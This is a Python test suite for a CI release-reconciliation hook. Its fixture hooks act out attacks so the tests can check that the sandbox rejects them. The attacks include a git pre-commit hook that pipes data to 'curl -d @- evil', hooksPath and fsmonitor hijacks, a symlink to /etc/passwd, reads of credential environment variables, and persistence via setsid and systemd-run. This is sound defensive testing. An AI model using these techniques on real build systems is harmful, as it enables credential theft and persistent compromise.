#!/usr/bin/env python3
"""Behavioural and adversarial coverage for the pre-credential reconciliation hook."""

import json
import os
import pathlib
import shlex
import shutil
import subprocess
import sys
import tempfile
import time
import unittest


ROOT = pathlib.Path(__file__).resolve().parents[1]
RECONCILER = ROOT / "scripts/container_release_reconcile.py"
HOOK = "scripts/release-reconcile.sh"


def git(repo, *args):
    return subprocess.run(
        ["git", "-C", str(repo), *args],
        check=True, capture_output=True, text=True,
    ).stdout


class Fixture:
    """A disposable consumer checkout plus a pinned contract checkout."""

    def __init__(self, stack):
        self.root = pathlib.Path(stack.enter_context(tempfile.TemporaryDirectory()))
        self.repo = self.root / "consumer"
        self.contract = self.repo / ".container-release-contract"
        (self.repo / "scripts").mkdir(parents=True)
        (self.repo / "deploy").mkdir()
        (self.repo / "Dockerfile").write_text("FROM ghcr.io/verjson/base:v0.2.0\n", encoding="utf-8")
        (self.repo / "deploy/values.yaml").write_text("tag: v0.2.0\n", encoding="utf-8")
        (self.repo / "docs.md").write_text("unrelated\n", encoding="utf-8")
        self.write_hook("#!/usr/bin/env bash\nexit 0\n")
        git(self.repo.parent, "init", "-q", str(self.repo))
        git(self.repo, "config", "user.name", "fixture")
        git(self.repo, "config", "user.email", "fixture@example.invalid")
        git(self.repo, "add", ".")
        git(self.repo, "commit", "-qm", "fixture")
        # The promote job leaves untracked release state in the workspace before
        # the hook runs; reconciliation must tolerate exactly that pre-existing set.
        self.manifest = self.repo / "release-manifest.json"
        self.manifest.write_text(json.dumps({"releaseVersion": "0.2.1"}) + "\n", encoding="utf-8")
        (self.repo / "state.json").write_text("{}\n", encoding="utf-8")
        self.contract_ref = self._make_contract()

    def _make_contract(self):
        (self.contract / "scripts").mkdir(parents=True)
        (self.contract / "scripts/changelog.py").write_text("# pinned engine\n", encoding="utf-8")
        git(self.contract.parent, "init", "-q", str(self.contract))
        git(self.contract, "config", "user.name", "fixture")
        git(self.contract, "config", "user.email", "fixture@example.invalid")
        git(self.contract, "add", ".")
        git(self.contract, "commit", "-qm", "contract")
        return git(self.contract, "rev-parse", "HEAD").strip()

    def write_hook(self, body, mode=0o755):
        path = self.repo / HOOK
        path.write_text(body, encoding="utf-8")
        path.chmod(mode)
        if (self.repo / ".git").exists():
            git(self.repo, "add", "--", HOOK)
            git(self.repo, "commit", "-qm", "hook")

    def run(self, allowlist=("Dockerfile", "deploy/values.yaml"), timeout="60", extra=()):
        return subprocess.run(
            [
                sys.executable, str(RECONCILER),
                "--repo-root", str(self.repo),
                "--allowlist", allowlist if isinstance(allowlist, str) else json.dumps(list(allowlist)),
                "--version", "0.2.1",
                "--manifest", "release-manifest.json",
                "--contract-root", ".container-release-contract",
                "--contract-ref", self.contract_ref,
                "--timeout", timeout,
                "--staged-list", "reconciled-paths.txt",
                *extra,
            ],
            capture_output=True, text=True,
        )

    def staged(self):
        out = git(self.repo, "diff", "--cached", "--name-only")
        return sorted(line for line in out.splitlines() if line)


class ReconcileTest(unittest.TestCase):
    def setUp(self):
        import contextlib
        self.stack = contextlib.ExitStack()
        self.addCleanup(self.stack.close)
        self.fixture = Fixture(self.stack)

    def test_accepts_and_stages_an_allowlisted_reconciliation(self):
        self.fixture.write_hook(
            "#!/usr/bin/env bash\n"
            "set -euo pipefail\n"
            'printf "FROM ghcr.io/verjson/base:v%s\\n" "$RELEASE_VERSION" > Dockerfile\n'
        )
        result = self.fixture.run()
        self.assertEqual(0, result.returncode, result.stderr)
        self.assertEqual(["Dockerfile"], self.fixture.staged())
        self.assertEqual(
            "FROM ghcr.io/verjson/base:v0.2.1\n",
            (self.fixture.repo / "Dockerfile").read_text(encoding="utf-8"),
        )
        self.assertEqual(
            "Dockerfile\n",
            (self.fixture.repo / "reconciled-paths.txt").read_text(encoding="utf-8"),
        )

    def test_rejects_and_rolls_back_a_modification_outside_the_allowlist(self):
        self.fixture.write_hook(
            "#!/usr/bin/env bash\n"
            "set -euo pipefail\n"
            'printf "FROM ghcr.io/verjson/base:v%s\\n" "$RELEASE_VERSION" > Dockerfile\n'
            'printf "smuggled\\n" > docs.md\n'
        )
        result = self.fixture.run()
        self.assertEqual(1, result.returncode, result.stdout)
        self.assertIn("docs.md", result.stderr)
        self.assertEqual([], self.fixture.staged())
        self.assertEqual("unrelated\n", (self.fixture.repo / "docs.md").read_text(encoding="utf-8"))
        self.assertEqual(
            "FROM ghcr.io/verjson/base:v0.2.0\n",
            (self.fixture.repo / "Dockerfile").read_text(encoding="utf-8"),
        )

    def test_rejects_untracked_output_produced_by_the_hook(self):
        self.fixture.write_hook(
            "#!/usr/bin/env bash\nset -euo pipefail\nprintf 'x\\n' > deploy/extra.yaml\n"
        )
        result = self.fixture.run()
        self.assertEqual(1, result.returncode, result.stdout)
        self.assertIn("untracked", result.stderr)
        self.assertIn("deploy/extra.yaml", result.stderr)

    def test_tolerates_the_untracked_release_state_present_before_the_hook(self):
        self.fixture.write_hook(
            "#!/usr/bin/env bash\nset -euo pipefail\nprintf 'tag: v0.2.1\\n' > deploy/values.yaml\n"
        )
        result = self.fixture.run()
        self.assertEqual(0, result.returncode, result.stderr)
        self.assertEqual(["deploy/values.yaml"], self.fixture.staged())

    def test_tolerates_an_unchanged_preexisting_untracked_directory(self):
        directory = self.fixture.repo / "preexisting-input"
        directory.mkdir()
        (directory / "payload.txt").write_text("release input\n", encoding="utf-8")

        result = self.fixture.run()

        self.assertEqual(0, result.returncode, result.stderr)
        self.assertEqual([], self.fixture.staged())

    def test_rejects_modifying_a_preexisting_untracked_release_manifest(self):
        self.fixture.write_hook(
            "#!/usr/bin/env bash\nset -euo pipefail\nprintf '{\\\"releaseVersion\\\":\\\"9.9.9\\\"}\\n' > release-manifest.json\n"
        )
        result = self.fixture.run()
        self.assertEqual(1, result.returncode, result.stdout)
        self.assertIn("modified pre-existing untracked output: release-manifest.json", result.stderr)

    def test_rejects_modifying_a_preexisting_untracked_candidate_archive(self):
        candidate_archive = self.fixture.repo / "candidate-manifest.zip"
        candidate_archive.write_bytes(b"verified candidate archive")
        self.fixture.write_hook(
            "#!/usr/bin/env bash\nset -euo pipefail\nprintf 'altered candidate archive\\n' > candidate-manifest.zip\n"
        )
        result = self.fixture.run()
        self.assertEqual(1, result.returncode, result.stdout)
        self.assertIn("modified pre-existing untracked output: candidate-manifest.zip", result.stderr)

    def test_rejects_modifying_a_preexisting_ignored_release_file(self):
        (self.fixture.repo / ".gitignore").write_text(".release-state.json\n", encoding="utf-8")
        git(self.fixture.repo, "add", ".gitignore")
        git(self.fixture.repo, "commit", "-qm", "ignore local release state")
        ignored_state = self.fixture.repo / ".release-state.json"
        ignored_state.write_text("original\n", encoding="utf-8")
        self.fixture.write_hook(
            "#!/usr/bin/env bash\nset -euo pipefail\nprintf 'changed\\n' > .release-state.json\n"
        )
        result = self.fixture.run()
        self.assertEqual(1, result.returncode, result.stdout)
        self.assertIn("modified pre-existing ignored output: .release-state.json", result.stderr)

    def test_rejects_deletion_of_an_allowlisted_path(self):
        self.fixture.write_hook("#!/usr/bin/env bash\nset -euo pipefail\nrm Dockerfile\n")
        result = self.fixture.run()
        self.assertEqual(1, result.returncode, result.stdout)
        self.assertIn("Dockerfile", result.stderr)
        self.assertEqual([], self.fixture.staged())
        self.assertTrue((self.fixture.repo / "Dockerfile").is_file())

    def test_rejects_replacing_an_allowlisted_path_with_a_symlink(self):
        self.fixture.write_hook(
            "#!/usr/bin/env bash\nset -euo pipefail\n"
            "rm Dockerfile\nln -s /etc/passwd Dockerfile\n"
        )
        result = self.fixture.run()
        self.assertEqual(1, result.returncode, result.stdout)
        self.assertIn("Dockerfile", result.stderr)
        self.assertEqual([], self.fixture.staged())
        self.assertFalse((self.fixture.repo / "Dockerfile").is_symlink())

    def test_rejects_a_file_mode_change_on_an_allowlisted_path(self):
        self.fixture.write_hook(
            "#!/usr/bin/env bash\nset -euo pipefail\n"
            'printf "FROM ghcr.io/verjson/base:v%s\\n" "$RELEASE_VERSION" > Dockerfile\n'
            "chmod +x Dockerfile\n"
        )
        result = self.fixture.run()
        self.assertEqual(1, result.returncode, result.stdout)
        self.assertIn("mode", result.stderr)
        self.assertEqual([], self.fixture.staged())

    def test_refuses_to_run_the_hook_when_the_tracked_tree_is_dirty(self):
        self.fixture.write_hook(
            "#!/usr/bin/env bash\nset -euo pipefail\nprintf 'ran\\n' > hook-ran\n"
        )
        (self.fixture.repo / "docs.md").write_text("locally dirty\n", encoding="utf-8")
        result = self.fixture.run()
        self.assertEqual(1, result.returncode, result.stdout)
        self.assertIn("clean", result.stderr)
        self.assertFalse((self.fixture.repo / "hook-ran").exists())
        self.assertEqual(
            "locally dirty\n", (self.fixture.repo / "docs.md").read_text(encoding="utf-8")
        )

    def test_fails_closed_when_the_hook_exits_non_zero(self):
        self.fixture.write_hook(
            "#!/usr/bin/env bash\nprintf 'half\\n' > Dockerfile\nexit 3\n"
        )
        result = self.fixture.run()
        self.assertEqual(1, result.returncode, result.stdout)
        self.assertIn("exited 3", result.stderr)
        self.assertEqual([], self.fixture.staged())
        self.assertEqual(
            "FROM ghcr.io/verjson/base:v0.2.0\n",
            (self.fixture.repo / "Dockerfile").read_text(encoding="utf-8"),
        )

    def test_fails_closed_when_the_hook_dies_from_a_signal(self):
        self.fixture.write_hook(
            "#!/usr/bin/env bash\nprintf 'half\\n' > Dockerfile\nkill -9 $$\n"
        )
        result = self.fixture.run()
        self.assertEqual(1, result.returncode, result.stdout)
        self.assertEqual([], self.fixture.staged())
        self.assertEqual(
            "FROM ghcr.io/verjson/base:v0.2.0\n",
            (self.fixture.repo / "Dockerfile").read_text(encoding="utf-8"),
        )

    def test_fails_closed_when_the_hook_exceeds_its_timeout(self):
        self.fixture.write_hook(
            "#!/usr/bin/env bash\nprintf 'half\\n' > Dockerfile\nsleep 30\n"
        )
        result = self.fixture.run(timeout="1")
        self.assertEqual(1, result.returncode, result.stdout)
        self.assertIn("timed out", result.stderr)
        self.assertEqual([], self.fixture.staged())

    def test_kills_processes_the_hook_leaves_behind(self):
        self.fixture.write_hook(
            "#!/usr/bin/env bash\nset -euo pipefail\n"
            "(sleep 3; printf 'survived\\n' > survivor) &\n"
            'printf "FROM ghcr.io/verjson/base:v%s\\n" "$RELEASE_VERSION" > Dockerfile\n'
            "exit 0\n"
        )
        result = self.fixture.run()
        self.assertEqual(0, result.returncode, result.stderr)
        import time
        time.sleep(4)
        self.assertFalse(
            (self.fixture.repo / "survivor").exists(),
            "a process the hook backgrounded outlived the bounded reconciliation step",
        )

    def test_rejects_a_missing_or_non_executable_hook(self):
        (self.fixture.repo / HOOK).chmod(0o644)
        git(self.fixture.repo, "update-index", "--chmod=-x", HOOK)
        git(self.fixture.repo, "commit", "-qm", "drop the executable bit")
        result = self.fixture.run()
        self.assertEqual(1, result.returncode, result.stdout)
        self.assertIn(HOOK, result.stderr)

    def test_rejects_a_hook_that_is_a_symlink(self):
        path = self.fixture.repo / HOOK
        path.unlink()
        path.symlink_to("/bin/true")
        git(self.fixture.repo, "add", "--", HOOK)
        git(self.fixture.repo, "commit", "-qm", "symlink the hook")
        result = self.fixture.run()
        self.assertEqual(1, result.returncode, result.stdout)
        self.assertIn("symlink", result.stderr)

    def test_rejects_an_untracked_hook(self):
        git(self.fixture.repo, "rm", "-q", "--cached", HOOK)
        git(self.fixture.repo, "commit", "-qm", "untrack the hook")
        result = self.fixture.run()
        self.assertEqual(1, result.returncode, result.stdout)
        self.assertIn("tracked", result.stderr)

    def test_rejects_structurally_unsafe_allowlists(self):
        cases = {
            "empty": [],
            "not a list": '{"Dockerfile": true}',
            "not json": "Dockerfile",
            "parent escape": ["../hostile"],
            "absolute": ["/etc/passwd"],
            "current directory segment": ["./Dockerfile"],
            "duplicate": ["Dockerfile", "Dockerfile"],
            "wildcard": ["*"],
            "empty entry": [""],
            "non string": [17],
            "oversized": [f"file{index}" for index in range(33)],
        }
        for label, allowlist in cases.items():
            with self.subTest(case=label):
                result = self.fixture.run(allowlist=allowlist)
                self.assertEqual(1, result.returncode, result.stdout)
                self.assertIn("allowlist", result.stderr)

    def test_rejects_allowlisting_release_engine_and_workflow_surfaces(self):
        protected = [
            ".github/workflows/container-release.yml",
            ".git/config",
            ".gitattributes",
            ".container-release-contract/scripts/changelog.py",
            "RELEASES/containers/v0.2.1.json",
            "CHANGELOG/v0.2.1.md",
            "NEXT/2026-09-01-issue-1203-x.md",
            "scripts/release-reconcile.sh",
            "scripts/container_release_promotion.py",
            "scripts/container_release_manifest.py",
            "scripts/container_artifact_extract.py",
            "scripts/container_attestation_verify.py",
            "scripts/container-release-contract.test.sh",
        ]
        for path in protected:
            with self.subTest(path=path):
                result = self.fixture.run(allowlist=[path])
                self.assertEqual(1, result.returncode, result.stdout)
                self.assertIn("allowlist", result.stderr)

    def test_rejects_an_allowlist_entry_that_is_not_a_reviewed_tracked_file(self):
        result = self.fixture.run(allowlist=["deploy/absent.yaml"])
        self.assertEqual(1, result.returncode, result.stdout)
        self.assertIn("deploy/absent.yaml", result.stderr)

    def test_rejects_an_allowlist_entry_that_is_a_symlink(self):
        link = self.fixture.repo / "deploy/link.yaml"
        link.symlink_to("../Dockerfile")
        git(self.fixture.repo, "add", "--", "deploy/link.yaml")
        git(self.fixture.repo, "commit", "-qm", "add a symlink")
        result = self.fixture.run(allowlist=["deploy/link.yaml"])
        self.assertEqual(1, result.returncode, result.stdout)
        self.assertIn("symlink", result.stderr)

    def test_rejects_a_hook_whose_output_is_not_idempotent(self):
        self.fixture.write_hook(
            "#!/usr/bin/env bash\nset -euo pipefail\nprintf 'x\\n' >> Dockerfile\n"
        )
        result = self.fixture.run()
        self.assertEqual(1, result.returncode, result.stdout)
        self.assertIn("idempotent", result.stderr)
        self.assertEqual([], self.fixture.staged())
        self.assertEqual(
            "FROM ghcr.io/verjson/base:v0.2.0\n",
            (self.fixture.repo / "Dockerfile").read_text(encoding="utf-8"),
        )

    def test_rejects_a_hook_that_tampers_with_the_pinned_contract_checkout(self):
        self.fixture.write_hook(
            "#!/usr/bin/env bash\nset -euo pipefail\n"
            'printf "FROM ghcr.io/verjson/base:v%s\\n" "$RELEASE_VERSION" > Dockerfile\n'
            "printf 'import os\\n' > .container-release-contract/scripts/changelog.py\n"
        )
        result = self.fixture.run()
        self.assertEqual(1, result.returncode, result.stdout)
        self.assertIn("contract", result.stderr)
        self.assertEqual([], self.fixture.staged())

    def test_rejects_a_contract_checkout_at_a_different_revision(self):
        result = self.fixture.run(extra=("--contract-ref", "b" * 40))
        self.assertEqual(1, result.returncode, result.stdout)
        self.assertIn("contract", result.stderr)

    def test_rejects_a_manifest_that_is_absent_or_a_symlink(self):
        self.fixture.manifest.unlink()
        self.fixture.manifest.symlink_to("/etc/passwd")
        result = self.fixture.run()
        self.assertEqual(1, result.returncode, result.stdout)
        self.assertIn("manifest", result.stderr)

    def test_hides_the_ambient_credential_environment_from_the_hook(self):
        self.fixture.write_hook(
            "#!/usr/bin/env bash\nset -euo pipefail\n"
            'printf "FROM ghcr.io/verjson/base:v%s\\n" "$RELEASE_VERSION" > Dockerfile\n'
            'printf "%s\\n" "${GH_TOKEN-unset} ${GITHUB_TOKEN-unset} '
            '${ACTIONS_ID_TOKEN_REQUEST_TOKEN-unset} ${AWS_SECRET_ACCESS_KEY-unset}" >> Dockerfile\n'
        )

        environment = dict(os.environ)
        environment.update({
            "GH_TOKEN": "ghs_secret", "GITHUB_TOKEN": "ghs_secret",
            "ACTIONS_ID_TOKEN_REQUEST_TOKEN": "oidc", "AWS_SECRET_ACCESS_KEY": "aws",
        })
        result = subprocess.run(
            [sys.executable, str(RECONCILER),
             "--repo-root", str(self.fixture.repo),
             "--allowlist", json.dumps(["Dockerfile"]),
             "--version", "0.2.1", "--manifest", "release-manifest.json",
             "--contract-root", ".container-release-contract",
             "--contract-ref", self.fixture.contract_ref,
             "--timeout", "60", "--staged-list", "reconciled-paths.txt"],
            capture_output=True, text=True, env=environment,
        )

        self.assertEqual(0, result.returncode, result.stderr)
        self.assertTrue(
            (self.fixture.repo / "Dockerfile").read_text(encoding="utf-8").endswith(
                "unset unset unset unset\n"
            ),
            repr((self.fixture.repo / "Dockerfile").read_text(encoding="utf-8")),
        )

    def test_rejects_a_hook_that_installs_a_git_hook(self):
        self.fixture.write_hook(
            "#!/usr/bin/env bash\n"
            'printf "tag\\n" > Dockerfile\n'
            'printf "#!/bin/sh\\ncurl -d @- evil\\n" > .git/hooks/pre-commit\n'
            "chmod +x .git/hooks/pre-commit\n"
        )
        result = self.fixture.run()
        self.assertEqual(1, result.returncode, result.stdout)
        self.assertIn("Git control surface", result.stderr)

    def test_rejects_a_hook_that_rewrites_git_config(self):
        self.fixture.write_hook(
            "#!/usr/bin/env bash\n"
            'printf "tag\\n" > Dockerfile\n'
            "git config core.hooksPath /tmp/attacker-hooks\n"
        )
        result = self.fixture.run()
        self.assertEqual(1, result.returncode, result.stdout)
        self.assertIn("Git control surface", result.stderr)

    def test_rejects_fsmonitor_config_without_running_its_helper_outside_the_sandbox(self):
        marker = self.fixture.root / "fsmonitor-executed"
        self.fixture.write_hook(
            "#!/usr/bin/env bash\n"
            "set -euo pipefail\n"
            "cat > .git/fsmonitor-hook <<'HELPER'\n"
            "#!/bin/sh\n"
            f"printf called > {shlex.quote(str(marker))}\n"
            "printf '\\n'\n"
            "HELPER\n"
            "chmod +x .git/fsmonitor-hook\n"
            "git config core.fsmonitor .git/fsmonitor-hook\n"
        )

        result = self.fixture.run()

        self.assertEqual(1, result.returncode, result.stdout)
        self.assertIn("Git control surface", result.stderr)
        self.assertIn("config", result.stderr)
        self.assertFalse(marker.exists(), "post-hook Git verification ran the configured fsmonitor helper")

    def test_failed_hook_config_change_does_not_run_fsmonitor_during_rollback(self):
        marker = self.fixture.root / "fsmonitor-rollback-executed"
        self.fixture.write_hook(
            "#!/usr/bin/env bash\n"
            "set -euo pipefail\n"
            "cat > .git/fsmonitor-hook <<'HELPER'\n"
            "#!/bin/sh\n"
            f"printf called > {shlex.quote(str(marker))}\n"
            "printf '\\n'\n"
            "HELPER\n"
            "chmod +x .git/fsmonitor-hook\n"
            "git config core.fsmonitor .git/fsmonitor-hook\n"
            "exit 17\n"
        )

        result = self.fixture.run()

        self.assertEqual(1, result.returncode, result.stdout)
        self.assertIn("Git control surface", result.stderr)
        self.assertFalse(marker.exists(), "rollback ran the configured fsmonitor helper")

    def test_rejects_changes_to_git_history_metadata_before_running_git(self):
        self.fixture.write_hook(
            "#!/usr/bin/env bash\n"
            "set -euo pipefail\n"
            "git rev-parse HEAD > .git/shallow\n"
        )

        result = self.fixture.run()

        self.assertEqual(1, result.returncode, result.stdout)
        self.assertIn("Git control surface", result.stderr)
        self.assertIn("shallow", result.stderr)

    def test_rejects_merge_state_that_would_add_an_unreviewed_release_parent(self):
        self.fixture.write_hook(
            "#!/usr/bin/env bash\n"
            "set -euo pipefail\n"
            "git rev-parse HEAD^ > .git/MERGE_HEAD\n"
        )

        result = self.fixture.run()

        self.assertEqual(1, result.returncode, result.stdout)
        self.assertIn("Git control surface", result.stderr)
        self.assertIn("MERGE_HEAD", result.stderr)

    def test_rejects_pre_existing_merge_state_before_running_the_hook(self):
        marker = self.fixture.repo / "hook-ran"
        self.fixture.write_hook(
            "#!/usr/bin/env bash\n"
            f"printf ran > {shlex.quote(str(marker))}\n"
        )
        (self.fixture.repo / ".git" / "MERGE_HEAD").write_text("a" * 40 + "\n", encoding="ascii")

        result = self.fixture.run()

        self.assertEqual(1, result.returncode, result.stdout)
        self.assertIn("Git operation state is not allowed", result.stderr)
        self.assertIn("MERGE_HEAD", result.stderr)
        self.assertFalse(marker.exists(), "reconciliation hook ran with pre-existing merge state")

    def test_rejects_a_hook_that_installs_a_git_replacement_ref(self):
        git(self.fixture.repo, "commit", "--allow-empty", "-qm", "second commit")
        self.fixture.write_hook(
            "#!/usr/bin/env bash\n"
            'printf "tag\\n" > Dockerfile\n'
            'git replace HEAD HEAD^\n'
        )

        result = self.fixture.run()

        self.assertEqual(1, result.returncode, result.stdout)
        self.assertIn("Git replacement refs are not allowed", result.stderr)

    def test_rejects_preexisting_git_replacement_refs(self):
        git(self.fixture.repo, "commit", "--allow-empty", "-qm", "second commit")
        git(self.fixture.repo, "replace", "HEAD", "HEAD^")

        result = self.fixture.run()

        self.assertEqual(1, result.returncode, result.stdout)
        self.assertIn("Git replacement refs are not allowed", result.stderr)

    def test_rejects_a_hook_that_rewrites_the_repository_exclude_file(self):
        self.fixture.write_hook(
            "#!/usr/bin/env bash\n"
            'printf "tag\\n" > Dockerfile\n'
            'printf "smuggled.txt\\n" >> .git/info/exclude\n'
            'printf "payload\\n" > smuggled.txt\n'
        )
        result = self.fixture.run()
        self.assertEqual(1, result.returncode, result.stdout)
        self.assertIn("Git control surface", result.stderr)

    def test_rejects_a_hook_that_tampers_with_the_pinned_checkouts_git_dir(self):
        self.fixture.write_hook(
            "#!/usr/bin/env bash\n"
            'printf "tag\\n" > Dockerfile\n'
            "git -C .container-release-contract config core.fsmonitor /tmp/liar\n"
        )
        result = self.fixture.run()
        self.assertEqual(1, result.returncode, result.stdout)
        self.assertIn("Git control surface", result.stderr)

    def test_rejects_a_hook_that_hides_a_changed_contract_engine_in_the_index(self):
        self.fixture.write_hook(
            "#!/usr/bin/env bash\n"
            'printf "tag\\n" > Dockerfile\n'
            "git -C .container-release-contract update-index --skip-worktree scripts/changelog.py\n"
            "printf '# changed engine\\n' > .container-release-contract/scripts/changelog.py\n"
        )
        result = self.fixture.run()
        self.assertEqual(1, result.returncode, result.stdout)
        self.assertIn("Git control surface", result.stderr)
        self.assertIn("index-entries", result.stderr)

    def test_kills_a_hook_descendant_that_escapes_its_process_group(self):
        self.fixture.write_hook(
            "#!/usr/bin/env bash\n"
            "set -euo pipefail\n"
            'setsid bash -c "sleep 0.2; printf \'# detached change\\n\' > '
            '.container-release-contract/scripts/changelog.py" </dev/null >/dev/null 2>&1 &\n'
        )
        result = self.fixture.run()
        self.assertEqual(0, result.returncode, result.stderr)

        time.sleep(0.3)

        self.assertEqual(
            "# pinned engine\n",
            (self.fixture.contract / "scripts/changelog.py").read_text(encoding="utf-8"),
        )

    def test_hook_cannot_gain_runner_privileges_for_a_persistent_service(self):
        self.fixture.write_hook(
            "#!/usr/bin/env bash\n"
            "set -euo pipefail\n"
            "grep -q '^NoNewPrivs:[[:space:]]*1$' /proc/self/status\n"
            "if command -v sudo >/dev/null 2>&1 && sudo -n -- true >/dev/null 2>&1; then\n"
            "  exit 42\n"
            "fi\n"
        )

        result = self.fixture.run()

        self.assertEqual(0, result.returncode, result.stderr)

    @unittest.skipUnless(shutil.which("systemd-run"), "systemd-run is unavailable")
    def test_hook_cannot_queue_a_runner_user_service_after_reconciliation(self):
        marker = self.fixture.root / "persistent-user-service-ran"
        service_command = f"printf escaped > {shlex.quote(str(marker))}"
        self.fixture.write_hook(
            "#!/usr/bin/env bash\n"
            "set -euo pipefail\n"
            'export XDG_RUNTIME_DIR="/run/user/$(id -u)"\n'
            'export DBUS_SESSION_BUS_ADDRESS="unix:path=$XDG_RUNTIME_DIR/bus"\n'
            'test ! -S "$XDG_RUNTIME_DIR/bus"\n'
            'test ! -S /run/dbus/system_bus_socket\n'
            "/usr/bin/systemd-run --user --no-block /bin/sh -c "
            f"{shlex.quote(service_command)} >/dev/null 2>&1 || true\n"
            'printf "tag\\n" > Dockerfile\n'
        )

        result = self.fixture.run()
        self.assertEqual(0, result.returncode, result.stderr)
        time.sleep(0.2)

        self.assertFalse(marker.exists(), "a runner user service outlived reconciliation")

    def test_hook_cannot_reach_the_runner_home_directory(self):
        """A writable `$HOME` is a `~/.gitconfig` away from the same escalation."""
        self.fixture.write_hook(
            "#!/usr/bin/env bash\n"
            'printf "%s\\n" "$HOME"\n'
            'printf "[core]\\n\\thooksPath = /tmp/attacker\\n" > "$HOME/.gitconfig"\n'
            'printf "tag\\n" > Dockerfile\n'
        )
        real_home = pathlib.Path(os.environ["HOME"]) / ".gitconfig"
        before = real_home.read_bytes() if real_home.is_file() else None
        result = self.fixture.run()
        self.assertEqual(0, result.returncode, result.stderr)
        sandbox_home = result.stdout.strip()
        self.assertNotEqual(os.environ["HOME"], sandbox_home)
        self.assertEqual(before, real_home.read_bytes() if real_home.is_file() else None)
        self.assertFalse(pathlib.Path(sandbox_home).exists())

    def test_hook_cannot_read_runner_temp_files(self):
        host_secret = self.fixture.root / "runner-temp-secret"
        host_secret.write_text("host-only credential\n", encoding="utf-8")
        self.fixture.write_hook(
            "#!/usr/bin/env bash\n"
            f"test ! -e {shlex.quote(str(host_secret))}\n"
            'printf "tag\\n" > Dockerfile\n'
        )

        result = self.fixture.run()

        self.assertEqual(0, result.returncode, result.stderr)
        self.assertEqual("host-only credential\n", host_secret.read_text(encoding="utf-8"))

    @unittest.skipUnless(shutil.which("unshare"), "unshare is required to test the nested namespace boundary")
    def test_hook_cannot_create_a_nested_user_namespace(self):
        self.fixture.write_hook(
            "#!/usr/bin/env bash\n"
            "set -euo pipefail\n"
            "if unshare --user true >/dev/null 2>&1; then exit 1; fi\n"
            'printf "tag\\n" > Dockerfile\n'
        )

        result = self.fixture.run()

        self.assertEqual(0, result.returncode, result.stderr)

    def test_rejects_a_hook_that_hides_output_in_an_ignored_path(self):
        (self.fixture.repo / ".gitignore").write_text("build/\n", encoding="utf-8")
        git(self.fixture.repo, "add", "--", ".gitignore")
        git(self.fixture.repo, "commit", "-qm", "ignore build")
        self.fixture.write_hook(
            "#!/usr/bin/env bash\n"
            'printf "tag\\n" > Dockerfile\n'
            "mkdir -p build\n"
            'printf "payload\\n" > build/smuggled.txt\n'
        )
        result = self.fixture.run()
        self.assertEqual(1, result.returncode, result.stdout)
        self.assertIn("ignored output", result.stderr)

    def test_rejects_a_hook_that_changes_a_preexisting_untracked_parent_directory_mode(self):
        directory = self.fixture.repo / "preexisting-input"
        directory.mkdir()
        (directory / "payload.txt").write_text("release input\n", encoding="utf-8")
        directory.chmod(0o500)
        self.fixture.write_hook(
            "#!/usr/bin/env bash\n"
            'printf "tag\\n" > Dockerfile\n'
            "chmod 700 preexisting-input\n"
        )
        result = self.fixture.run()
        self.assertEqual(1, result.returncode, result.stdout)
        self.assertIn("modified pre-existing untracked output: preexisting-input/", result.stderr)


class AllowlistShapeTest(unittest.TestCase):
    def setUp(self):
        import contextlib
        self.stack = contextlib.ExitStack()
        self.addCleanup(self.stack.close)
        self.fixture = Fixture(self.stack)

    def test_rejects_an_allowlist_entry_that_names_a_directory(self):
        """`ls-files -- deploy` lists the files *under* it; the entry itself is not one."""
        result = self.fixture.run(allowlist=["deploy"])
        self.assertEqual(1, result.returncode, result.stdout)
        self.assertIn("not a reviewed tracked file", result.stderr)

    def test_rejects_a_tracked_staged_list_path(self):
        """A committed `reconciled-paths.txt` would be rewritten behind the reviewers."""
        (self.fixture.repo / "reconciled-paths.txt").write_text("Dockerfile\n", encoding="utf-8")
        git(self.fixture.repo, "add", "--", "reconciled-paths.txt")
        git(self.fixture.repo, "commit", "-qm", "staged list")
        result = self.fixture.run()
        self.assertEqual(1, result.returncode, result.stdout)
        self.assertIn("reconciled-paths.txt", result.stderr)


if __name__ == "__main__":
    unittest.main()
